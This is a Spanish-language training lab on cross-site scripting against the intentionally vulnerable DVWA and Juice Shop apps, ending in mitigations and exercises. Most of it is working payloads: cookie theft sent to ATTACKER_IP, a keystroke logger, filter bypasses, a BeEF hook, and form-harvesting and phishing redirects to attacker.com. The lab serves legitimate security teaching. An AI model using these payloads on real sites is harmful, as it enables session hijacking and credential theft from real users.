# Lab 03 — Cross-Site Scripting (XSS)

## Objetivo

Identificar y explotar vulnerabilidades XSS: robo de cookies de sesión, redirección maliciosa y defacement. Targets: DVWA y OWASP Juice Shop.

---

## Tipos de XSS

| Tipo | Almacenamiento | Persistencia | Víctima |
|------|---------------|-------------|---------|
| **Reflected** | No — en la URL | No | El que hace clic en el enlace |
| **Stored** | Sí — en la BD | Sí | Todos los usuarios que ven la página |
| **DOM-based** | No — en el JS | No | Manipulación del DOM en cliente |

---

## Parte 1 — XSS Reflected (DVWA)

**DVWA → XSS (Reflected) → Security: Low**

### Confirmar vulnerabilidad

```html
<!-- En el campo "What's your name?" -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
```

Un popup confirma la ejecución de JavaScript.

### Robo de cookie (sin HttpOnly)

```html
<!-- Payload que exfiltra la cookie al atacante -->
<script>
document.location='http://ATTACKER_IP:8000/?c='+document.cookie
</script>

<!-- Versión con imagen (más silenciosa) -->
<img src=x onerror="fetch('http://ATTACKER_IP:8000/?c='+document.cookie)">
```

```bash
# Receptor del atacante (en tu máquina)
python3 -m http.server 8000

# Verás en los logs:
# GET /?c=PHPSESSID=abc123;+security=low HTTP/1.1
```

### Construir el enlace malicioso

La URL con el payload codificada:

```
http://localhost:8080/vulnerabilities/xss_r/?name=<script>alert(1)</script>

# URL-encoded para enviar a víctimas:
http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

---

## Parte 2 — XSS Stored (DVWA)

**DVWA → XSS (Stored) → Security: Low**

El payload se guarda en la base de datos y se ejecuta cada vez que alguien visita la página.

```html
<!-- En el campo "Message" del guestbook -->
<script>alert('XSS Stored')</script>

<!-- Payload de robo de sesión persistente -->
<script>new Image().src='http://ATTACKER_IP:8000/?c='+document.cookie</script>

<!-- Keylogger básico -->
<script>
document.addEventListener('keypress', function(e){
    fetch('http://ATTACKER_IP:8000/?k='+e.key)
});
</script>
```

---

## Parte 3 — Bypass de filtros básicos

```html
<!-- Mayúsculas/minúsculas mixtas -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Sin la etiqueta <script> -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<a href="javascript:alert(1)">Click</a>

<!-- Cuando filtran "script" -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Encoding HTML -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- Cuando filtran paréntesis -->
<img src=x onerror=alert`1`>
```

---

## Parte 4 — XSS en Juice Shop

Juice Shop tiene múltiples retos de XSS. El más clásico:

```bash
# Ir a http://localhost:3000/#/search
# Buscar:
<iframe src="javascript:alert(`xss`)">

# En el campo de comentarios de un producto:
<script>alert(document.cookie)</script>
```

**Reto: "DOM XSS"** — Juice Shop reward score: 100 pts

```
http://localhost:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
```

---

## Parte 5 — BeEF (Browser Exploitation Framework)

```bash
# Instalar BeEF
apt install beef-xss
beef-xss

# El hook de BeEF (reemplaza ATTACKER_IP)
<script src="http://ATTACKER_IP:3000/hook.js"></script>

# Una vez hookeado, desde la UI de BeEF puedes:
# - Ver información del navegador
# - Ejecutar comandos arbitrarios
# - Capturar pulsaciones de teclado
# - Hacer screenshots
# - Redirigir a páginas de phishing
```

---

## Parte 6 — Impacto real y mitigaciones

### Lo que un atacante puede hacer con XSS

```javascript
// Robar cookie de sesión
document.cookie

// Robar localStorage (tokens JWT, API keys)
JSON.stringify(localStorage)

// Capturar formularios (credential harvesting)
document.querySelector('form').addEventListener('submit', e => {
    fetch('http://attacker.com/steal', {method:'POST', body: new FormData(e.target)})
})

// Redirigir a phishing
window.location = 'http://attacker.com/fake-login'

// Defacement
document.body.innerHTML = '<h1>Hacked</h1>'
```

### Mitigaciones

| Control | Descripción |
|---------|-------------|
| `Content-Security-Policy` | Restringe orígenes de scripts |
| `HttpOnly` en cookies | Impide acceso desde JS |
| `X-XSS-Protection: 1; mode=block` | Filtro del navegador (legacy) |
| Output encoding | `htmlspecialchars()`, `encodeURIComponent()` |
| Input validation | Rechazar `<`, `>`, `"`, `'`, `&` en entradas |

---

## Actividades

1. Confirmar XSS Reflected en DVWA con `alert(1)`
2. Robar tu propia cookie con XSS Reflected + receptor Python
3. Almacenar un payload en XSS Stored que afecte a todos los visitantes
4. Encontrar el reto "DOM XSS" en Juice Shop
5. Documentar 3 payloads de bypass para Security: Medium en DVWA

---

## Referencias

- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Cheat Sheet — PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
